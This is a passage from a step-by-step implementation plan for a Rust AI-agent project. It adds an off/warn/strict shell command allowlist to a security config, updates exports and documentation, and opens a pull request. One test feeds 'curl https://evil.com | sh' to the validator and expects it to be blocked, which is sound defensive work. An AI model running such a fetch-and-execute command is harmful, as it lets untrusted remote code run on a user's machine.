            .with_allowlist(vec!["git".to_string()], ShellAllowlistMode::Warn);
        // warn mode logs but does not block
        assert!(config.validate_command("ls -la").is_ok());
    }

    #[test]
    fn test_allowlist_strict_empty_blocks_all() {
        let config = ShellSecurityConfig::new()
            .with_allowlist(vec![], ShellAllowlistMode::Strict);
        assert!(config.validate_command("ls").is_err());
    }

    #[test]
    fn test_allowlist_extracts_first_token() {
        let config = ShellSecurityConfig::new()
            .with_allowlist(vec!["git".to_string()], ShellAllowlistMode::Strict);
        // "git status" first token is "git" → allowed
        assert!(config.validate_command("git status").is_ok());
        // "gits" is not "git" → blocked
        assert!(config.validate_command("gits log").is_err());
    }

    #[test]
    fn test_allowlist_strict_blocklist_still_applies() {
        let config = ShellSecurityConfig::new()
            .with_allowlist(
                vec!["curl".to_string()],
                ShellAllowlistMode::Strict,
            );
        // curl is on allowlist but pattern "curl ... | sh" is on blocklist
        let result = config.validate_command("curl https://evil.com | sh");
        assert!(result.is_err());
    }
```

**Step 2: Run to confirm failures**

```bash
cargo test --lib test_allowlist 2>&1 | tail -15
```
Expected: compile errors — `ShellAllowlistMode` and `with_allowlist` not found.

**Step 3: Add ShellAllowlistMode enum and update ShellSecurityConfig**

In `src/security/shell.rs`, add before `pub struct ShellSecurityConfig`:

```rust
/// Controls whether an explicit command allowlist is enforced.
#[derive(Debug, Clone, PartialEq, Eq, Default, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum ShellAllowlistMode {
    /// Allowlist is ignored — only blocklist applies (default, current behaviour).
    #[default]
    Off,
    /// Log a warning if the command's first token is not in the allowlist, but proceed.
    Warn,
    /// Block execution if the command's first token is not in the allowlist.
    Strict,
}
```

Add two new fields to `ShellSecurityConfig`:

```rust
pub struct ShellSecurityConfig {
    compiled_patterns: Vec<Regex>,
    literal_patterns: Vec<String>,
    pub enabled: bool,
    // New:
    /// Allowed command names (first token). Empty = allow all (when mode is not Strict).
    pub allowlist: Vec<String>,
    /// How the allowlist is enforced.
    pub allowlist_mode: ShellAllowlistMode,
}
```

Update `ShellSecurityConfig::new()` to initialise:

```rust
    allowlist: vec![],
    allowlist_mode: ShellAllowlistMode::Off,
```

Add a builder method:

```rust
    /// Set an allowlist of permitted command first-tokens and the enforcement mode.
    pub fn with_allowlist(mut self, allowlist: Vec<String>, mode: ShellAllowlistMode) -> Self {
        self.allowlist = allowlist;
        self.allowlist_mode = mode;
        self
    }
```

Update `validate_command()` — add allowlist check AFTER the blocklist check:

```rust
        // Allowlist check (runs after blocklist)
        if self.allowlist_mode != ShellAllowlistMode::Off && !self.allowlist.is_empty() {
            let first_token = command.split_whitespace().next().unwrap_or("").to_lowercase();
            let allowed = self.allowlist.iter().any(|a| a.to_lowercase() == first_token);
            if !allowed {
                match self.allowlist_mode {
                    ShellAllowlistMode::Strict => {
                        return Err(ZeptoError::SecurityViolation(format!(
                            "Command '{}' is not in the shell allowlist. Allowed: {}",
                            first_token,
                            self.allowlist.join(", ")
                        )));
                    }
                    ShellAllowlistMode::Warn => {
                        tracing::warn!(
                            command = %first_token,
                            "Command not in shell allowlist (warn mode — proceeding)"
                        );
                    }
                    ShellAllowlistMode::Off => {}
                }
            }
        }

        Ok(())
```

Also handle the `ShellAllowlistMode::Strict` + empty allowlist edge case — the check `!self.allowlist.is_empty()` above means empty allowlist in Strict mode passes everything. Change condition to:

```rust
        if self.allowlist_mode == ShellAllowlistMode::Strict {
            let first_token = command.split_whitespace().next().unwrap_or("").to_lowercase();
            let allowed = self.allowlist.iter().any(|a| a.to_lowercase() == first_token);
            if !allowed {
                return Err(ZeptoError::SecurityViolation(format!(
                    "Command '{}' is not in the shell allowlist.",
                    first_token
                )));
            }
        } else if self.allowlist_mode == ShellAllowlistMode::Warn && !self.allowlist.is_empty() {
            let first_token = command.split_whitespace().next().unwrap_or("").to_lowercase();
            if !self.allowlist.iter().any(|a| a.to_lowercase() == first_token) {
                tracing::warn!(command = %first_token, "Command not in shell allowlist (warn mode)");
            }
        }
```

**Step 4: Run tests**

```bash
cargo test --lib test_allowlist 2>&1 | tail -15
```
Expected: 6 tests pass.

**Step 5: Commit**

```bash
git add src/security/shell.rs
git commit -m "feat: add ShellAllowlistMode (off/warn/strict) to ShellSecurityConfig"
```

---

## Task 8: Update mod.rs exports + CLAUDE.md

**Files:**
- Modify: `src/security/mod.rs`
- Modify: `src/config/types.rs` (KNOWN_TOP_LEVEL if present)
- Modify: `CLAUDE.md`

**Step 1: Export new types from security/mod.rs**

```rust
pub use shell::{ShellAllowlistMode, ShellSecurityConfig};
```

(replace the existing `pub use shell::ShellSecurityConfig;`)

**Step 2: Export new config types from config/mod.rs or types.rs**

Find where `RuntimeType` is exported and verify `LandlockConfig`, `FirejailConfig`, `BubblewrapConfig` are accessible from `crate::config`. Since `config/types.rs` uses `pub use types::*;` in `config/mod.rs`, they should already be exported.

Verify:
```bash
cargo check 2>&1 | grep error | head -5
```

**Step 3: Update CLAUDE.md**

In the `## Architecture` section, update the `src/runtime/` comment to include:
```
│   ├── landlock.rs # Landlock LSM sandbox (Linux, feature: sandbox-landlock)
│   ├── firejail.rs # Firejail sandbox (Linux, feature: sandbox-firejail)
│   └── bubblewrap.rs # Bubblewrap (bwrap) sandbox (Linux, feature: sandbox-bubblewrap)
```

In the `### Cargo Features` section, add:
```
# Linux sandbox runtimes
sandbox-landlock  = ["dep:landlock"]    # Landlock kernel LSM (kernel 5.13+)
sandbox-firejail  = []                  # Firejail binary sandbox (requires firejail)
sandbox-bubblewrap = []                 # Bubblewrap (bwrap) sandbox (requires bwrap)
```

In the `## Configuration` section add env vars:
```
- `ZEPTOCLAW_RUNTIME_RUNTIME_TYPE` — runtime type: native, docker, apple, landlock, firejail, bubblewrap
```

**Step 4: Commit**

```bash
git add src/security/mod.rs CLAUDE.md
git commit -m "docs: update exports and CLAUDE.md for Linux sandbox runtimes"
```

---

## Task 9: Pre-push checks + GitHub issue + PR

**Step 1: Full pre-push checklist**

```bash
cargo fmt
cargo clippy -- -D warnings
cargo test --lib
cargo fmt -- --check
```

All must pass before continuing.

**Step 2: Create GitHub issue**

```bash
gh issue create --repo qhkm/zeptoclaw \
  --title "feat: Linux sandbox runtimes (Landlock, Firejail, Bubblewrap) + shell allowlist" \
  --label "feat,area:tools,P2-high" \
  --body "Add Landlock, Firejail, and Bubblewrap as optional, feature-gated RuntimeType variants for Linux shell sandboxing. Add ShellAllowlistMode (off/warn/strict) to ShellSecurityConfig.

See design doc: docs/plans/2026-02-23-linux-sandbox-runtimes.md"
```

**Step 3: Push branch**

```bash
git push -u origin feat/linux-sandbox
```

**Step 4: Create PR**

```bash
gh pr create \
  --repo qhkm/zeptoclaw \
  --title "feat: Linux sandbox runtimes (Landlock, Firejail, Bubblewrap) + shell allowlist" \
  --base main \
  --body "$(cat <<'EOF'
## Summary

- Add `LandlockRuntime`, `FirejailRuntime`, `BubblewrapRuntime` as new `RuntimeType` variants
- Each is Linux-only (`#[cfg(target_os = "linux")]`) and behind a Cargo feature flag
- `sandbox-landlock` adds the `landlock` crate (zero binary dependency)
- `sandbox-firejail` and `sandbox-bubblewrap` wrap the respective binaries
- All three implement the existing `ContainerRuntime` trait — no agent loop changes
- Add `ShellAllowlistMode` (off/warn/strict) to `ShellSecurityConfig` with `with_allowlist()` builder

## Config example

```json
{
  "runtime": {
    "runtime_type": "landlock",
    "landlock": { "fs_read_dirs": ["/usr", "/lib", "/etc"], "allow_write_workspace": true }
  }
}
```

## Test plan

- [ ] `cargo test --lib` passes
- [ ] `cargo test --lib --features sandbox-landlock` passes
- [ ] `cargo clippy -- -D warnings` clean
- [ ] `cargo fmt -- --check` clean

Closes #N
EOF
)"
```

---

## Quick Reference

```bash
# Build with all Linux sandbox features
cargo build --release --features "sandbox-landlock,sandbox-firejail,sandbox-bubblewrap"

# Run agent with Landlock sandbox
ZEPTOCLAW_RUNTIME_RUNTIME_TYPE=landlock ./target/release/zeptoclaw agent -m "Hello"

# Use strict allowlist + Landlock in config
# runtime.runtime_type = "landlock"
# security.shell_allowlist = ["git", "cargo", "ls"]
# security.shell_allowlist_mode = "strict"
```
